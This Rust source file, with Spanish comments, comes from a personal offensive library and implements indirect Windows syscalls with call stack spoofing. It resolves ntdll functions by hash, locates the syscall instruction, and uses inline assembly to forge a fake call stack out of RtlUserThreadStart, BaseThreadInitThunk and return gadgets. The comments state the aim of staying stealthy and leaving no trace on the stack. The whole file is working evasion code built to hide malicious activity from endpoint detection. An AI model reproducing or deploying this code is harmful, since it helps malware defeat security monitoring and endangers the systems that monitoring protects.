use std::arch::asm;
use zada_xor::memory::process::pattern_scan_mem::find_pattern_in_specific_func; // estos imports "zada-xor" vienen de mi propia lib que estoy desarrollando, el repo esta en github ;)
use zada_xor::techniques::evasion::dinamic_api_resolution::{
    get_export_by_name_hash, get_ntdll_base,
};
use zada_xor::techniques::evasion::stack_spoofing::call_stack_spoofing::*;

/* IMPLEMENTACION DE INDIRECT SYSCALL CON CALL STACK SPOOFING by lcalzada-xor*/

#[cfg(target_arch = "x86_64")] // la indirect syscall solo las implemento para x64 dado que para x86 en un entorno wow64 habria que hacer heavens gate y pasar por las syscalls de nt64 y eso es un lio, pero seria algo interesante y stealthy
pub unsafe fn indirect_syscall_6(
    api_hash: u32,
    sys_number: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> Result<i32, String> {
    let base = match unsafe { get_ntdll_base() } {
        Ok(base) => base,
        Err(e) => return Err(format!("NTDLL not found: {}", e)),
    };

    let address_api = match get_export_by_name_hash(base, api_hash) {
        Ok(addr) => addr,
        Err(e) => return Err(format!("Api with hash {:#08x} not found: {}", api_hash, e)),
    };

    //buscamos addrs exacta de la syscall
    let pattern_syscall: &[&[u8]] = &[&[0x0F, 0x05, 0xC3]];
    let address_api_rva = address_api as usize - base as usize;
    let syscall_address =
        match find_pattern_in_specific_func(pattern_syscall, address_api_rva as u32, base) {
            Some(addr) => addr,
            None => return Err(String::from("Syscall instruction not found")),
        };

    // calculamos la estructura con toda la info de call stack spoofing
    let spoof_data = match prepare_spoof_data() {
        Ok(data) => data,
        Err(e) => return Err(format!("Failed to prepare spoof data: {}", e)),
    };
    let spoof_ptr = &spoof_data as *const SpoofData;
    let mut status: i32;

    #[cfg(debug_assertions)]
    println!(
        "Syscall Info: Sysnumber={:#x}, SyscallAddress={:#x}, ApiHash={:#x}, SpoofData={:?}",
        sys_number, syscall_address, api_hash, spoof_data
    );
    // luego para volver se usa un gadget add rsp, 0x28  ; (o el tamaño que se necesite) ret -> a esto se le llama buscar gadgets
    macro_rules! execute_ind_syscall_with_spoof {
        ($save_rsp:expr, $restore_rsp:expr, $anchor_lea:expr, $save_reg_name:tt, $anchor_reg_name:tt) => {

            asm!(

                $save_rsp,

                "mov r11, [{spoof_ptr_reg} + 0x00]", // pillamos el tamaño de la pila a agrandar para spoofear
                "sub rsp, r11", // agrandamos el tamaño de la pila

                // se aprovecha de el ultimo espacio del stack para guardar las vars, muy loco!!!
                "mov [rsp + 0x28], r13", //reg 5 y 6
                "mov [rsp + 0x30], r14",

                //  RtlUserThreadStart
                "mov r10, [{spoof_ptr_reg} + 0x08]",   // pos1
                "mov r11, [{spoof_ptr_reg} + 0x10]",  // fn_addr_1
                "mov [rsp + r10], r11",

                "mov r10, [{spoof_ptr_reg} + 0x48]",   // null_ret_offset
                "mov qword ptr [rsp + r10], 0", // metemos un 0 aqui para que termine el unwind del stack

                //  BaseThreadInitThunk
                "mov r10, [{spoof_ptr_reg} + 0x18]",   // pos2
                "mov r11, [{spoof_ptr_reg} + 0x20]",   // fn_addr_2
                "mov [rsp + r10], r11",
                //  gadget 1
                "mov r10, [{spoof_ptr_reg} + 0x28]",   // pos3
                "mov r11, [{spoof_ptr_reg} + 0x30]",   // fn_addr_3
                "mov [rsp + r10], r11",
                // gadget 2
                "mov r10, [{spoof_ptr_reg} + 0x38]",   // pos4
                "mov r11, [{spoof_ptr_reg} + 0x40]",   // fn_addr_4
                "mov [rsp + r10], r11",



                // Ejecución Syscall
                "mov r10, rcx",                // Syscall abi
                "mov eax, {sys_number:e}",     // Syscall number

                $anchor_lea, // Dinámico: "lea rbx, [rip + 2f]", etc

                "jmp {syscall_addr}",         // mucho mejor con jmp que con call ya que no deja rastro en la pila (nos romperia el call stack spoof)

                "2:",
                "nop",
                $restore_rsp,

                sys_number = in(reg) sys_number,
                syscall_addr = in(reg) syscall_address,
                spoof_ptr_reg = in(reg) spoof_ptr, // struct de la config (nos deja manejar en un solo registro mucha config)
                in("r13") a5,
                in("r14") a6,
                inout("rcx") a1 => _,
                inout("rdx") a2 => _,
                inout("r8") a3 => _,
                inout("r9") a4 => _,
                out("r10") _,
                out("r11") _,
                lateout("eax") status,
                out($save_reg_name) _,
                out($anchor_reg_name) _,
                clobber_abi("win64")
            )

        }
    }
    unsafe {
        // si el gadget es R12, usamos RDI para guardar la pila
        // seleccion de que instruccion usar para guardar el rsp
        match spoof_data.anchor_register {
            Reg::Rdi => {
                execute_ind_syscall_with_spoof!(
                    "mov r12, rsp",
                    "mov rsp, r12",
                    "lea rdi, [rip + 2f]",
                    "r12",
                    "rdi"
                )
            }
            Reg::Rsi => {
                execute_ind_syscall_with_spoof!(
                    "mov r12, rsp",
                    "mov rsp, r12",
                    "lea rsi, [rip + 2f]",
                    "r12",
                    "rsi"
                )
            }
            Reg::R15 => {
                execute_ind_syscall_with_spoof!(
                    "mov r12, rsp",
                    "mov rsp, r12",
                    "lea r15, [rip + 2f]",
                    "r12",
                    "r15"
                )
            }
            Reg::R12 => {
                execute_ind_syscall_with_spoof!(
                    "mov rdi, rsp",
                    "mov rsp, rdi",
                    "lea r12, [rip + 2f]",
                    "rdi",
                    "r12"
                )
            }
        }
    }
    Result::Ok(status)
}
